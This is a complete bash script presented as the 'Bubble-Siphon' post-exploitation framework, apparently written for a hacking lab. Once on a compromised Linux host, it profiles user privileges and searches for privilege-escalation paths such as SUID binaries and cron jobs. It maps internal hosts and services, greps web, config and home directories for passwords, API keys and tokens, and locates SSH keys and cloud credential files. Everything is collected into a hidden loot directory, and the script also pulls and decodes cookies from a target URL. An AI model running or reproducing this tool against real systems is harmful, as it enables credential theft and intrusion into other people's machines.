#!/bin/bash
# Bubble-Siphon v2.1 - Advanced Post-Exploitation Framework
# Author: Bubble 🫧

# --- Professional UI ---
BOLD='\033[1m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' 

echo -e "${MAGENTA}${BOLD}"
echo "  ____        _     _     _      "
echo " | __ ) _   _| |__ | |__ | | ___ "
echo " |  _ \| | | | '_ \| '_ \| |/ _ \\"
echo " | |_) | |_| | |_) | |_) | |  __/"
echo " |____/ \__,_|_.__/|_.__/|_|\___| SIPHON v2.1"
echo -e "${NC}"

if [ -z "$1" ]; then
    echo -e "${RED}[!] Error: Target URL required for Phase 6.${NC}"
    echo -e "${YELLOW}Usage: ./bubble_siphon.sh <http://target-ip/path>${NC}"
    # We continue, but skip phase 6 if no URL
fi

TARGET_URL=$1
LOOT_DIR=".bubble_loot_$(date +%s)"
mkdir $LOOT_DIR

# 1. HOST & PRIVILEGE PROFILING
echo -e "${CYAN}[*] Phase 1: Profiling Identity & Privileges...${NC}"
{
    echo "--- IDENTITY ---"
    id
    echo -e "\n--- SUDO POWERS ---"
    sudo -l -n 2>/dev/null || echo "No passwordless sudo access."
    echo -e "\n--- KERNEL & ARCH ---"
    uname -a
} > "$LOOT_DIR/01_identity.txt"

# 2. PRIVILEGE ESCALATION VECTORS
echo -e "${CYAN}[*] Phase 2: Hunting for Privilege Escalation Vectors...${NC}"
{
    echo "--- SUID FILES (Potential Root Path) ---"
    find / -perm -4000 -type f 2>/dev/null
    echo -e "\n--- WRITABLE CRON JOBS ---"
    ls -la /etc/cron* 2>/dev/null
} > "$LOOT_DIR/02_privesc_vectors.txt"

# 3. NETWORK & LATERAL MOVEMENT SNOOPING
echo -e "${CYAN}[*] Phase 3: Mapping Internal Network & Connections...${NC}"
{
    echo "--- INTERNAL HOSTS ---"
    cat /etc/hosts
    echo -e "\n--- ARP TABLE (Neighboring Machines) ---"
    arp -e 2>/dev/null
    echo -e "\n--- ACTIVE INTERNAL SERVICES (Netstat) ---"
    netstat -tulnp 2>/dev/null || ss -tuln
} > "$LOOT_DIR/03_network_map.txt"

# 4. DEEP SECRET SCAVENGING
echo -e "${CYAN}[*] Phase 4: Siphoning Configs & API Keys...${NC}"
find /var/www /opt /home -name "*.env" -o -name "config*" -o -name ".*_history" 2>/dev/null >"$LOOT_DIR/04_target_files.txt"
grep -riE "api_key|password|db_pass|secret|token|bearer|mongodb|redis" /var/www /etc /home 2>/dev/null | grep -v ".js\|.css" | head -n 1000 > "$LOOT_DIR/04_leaked_secrets.txt"

# 5. SSH & CLOUD ACCESS KEYS
echo -e "${CYAN}[*] Phase 5: Hunting for Access Keys...${NC}"
find / -name "id_rsa" -o -name "*.pem" -o -name "*.pub" -o -name "credentials" 2>/dev/null | grep -E ".ssh|.aws|.azure|.gcloud" > "$LOOT_DIR/05_access_keys.txt"

# 6. UNIVERSAL COOKIE SIPHON (New!)
if [ -n "$TARGET_URL" ]; then
    echo -e "${CYAN}[*] Phase 6: Universal Cookie Siphon & Decoding...${NC}"
    {
        raw_cookies=$(curl -s -I "$TARGET_URL" | grep -i "Set-Cookie")
        if [ -n "$raw_cookies" ]; then
            echo "$raw_cookies" | while read -r line; do
                cookie_pair=$(echo "$line" | awk '{print $2}' | cut -d';' -f1)
                name=$(echo "$cookie_pair" | cut -d'=' -f1)
                value=$(echo "$cookie_pair" | cut -d'=' -f2)
                
                echo -e "[+] Siphoned: $name=$value"
                
                # Decoding Chain: URL -> Base64
                url_decoded=$(python3 -c "import urllib.parse as ul; print(ul.unquote('$value'))" 2>/dev/null)
                b64_decoded=$(echo "$url_decoded" | base64 -d 2>/dev/null)
                
                if [ -n "$b64_decoded" ]; then
                    echo "    [!] Decoded (B64): $b64_decoded"
                    # Match MD5 Hashes (Targeting Lab N7 Admin logic)
                    if [[ $b64_decoded =~ ^[a-f0-9]{32}$ ]]; then
                        echo "    [!!!] HASH DETECTED: $b64_decoded"
                    fi
                fi
            done
        else
            echo "No cookies found in headers."
        fi
    } > "$LOOT_DIR/06_cookies.txt"
fi

echo -e "------------------------------------"
echo -e "${GREEN}${BOLD}[+] SIPHON COMPLETE${NC}"
echo -e "${YELLOW}[!] Loot Directory: $LOOT_DIR${NC}"
echo -e "${YELLOW}[!] Total Secrets Flagged: $(wc -l < $LOOT_DIR/04_leaked_secrets.txt)${NC}"
